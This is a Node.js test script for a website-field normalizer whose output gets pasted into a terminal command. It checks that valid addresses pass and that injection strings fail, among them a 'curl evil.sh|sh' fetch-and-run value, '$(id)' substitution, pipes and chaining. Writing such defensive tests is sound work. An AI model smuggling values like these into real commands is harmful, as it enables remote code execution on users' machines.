// node scripts/check-website-input.mjs
// The audit form's website field ends up in a "Run: node audit.mjs …" line
// that gets pasted into a terminal. Real addresses must pass; anything that
// could act as a shell command must not.
import assert from "node:assert/strict";
import { normalizeWebsite } from "../src/lib/website-input.ts";

const ok = {
  "example.com": "example.com",
  "  https://Example.com/  ": "Example.com",
  "http://www.example.co.uk/services/dental-implants/": "www.example.co.uk/services/dental-implants",
  "example.com/?utm_source=x#top": "example.com",
  "example.com/caf%C3%A9": "example.com/caf%C3%A9",
  "xn--caf-dma.com/~team": "xn--caf-dma.com/~team",
};
for (const [input, want] of Object.entries(ok)) assert.equal(normalizeWebsite(input), want, input);

const bad = [
  "", "   ", "localhost", "example", "-example.com", "example.com:8080",
  "user:pass@example.com", "example.com/x;curl evil.sh|sh", "example.com/$(id)",
  "example.com/`id`", "example.com/a&&b", "example.com/a|b", "example.com/a b",
  "example.com/a'b", 'example.com/a"b', "example.com/%USERPROFILE%",
  "example.com/a\nb", "example.com/<script>", "example.com/a\\b",
];
for (const input of bad) assert.equal(normalizeWebsite(input), null, JSON.stringify(input));

console.log(`website input check passed (${Object.keys(ok).length} accepted, ${bad.length} rejected)`);
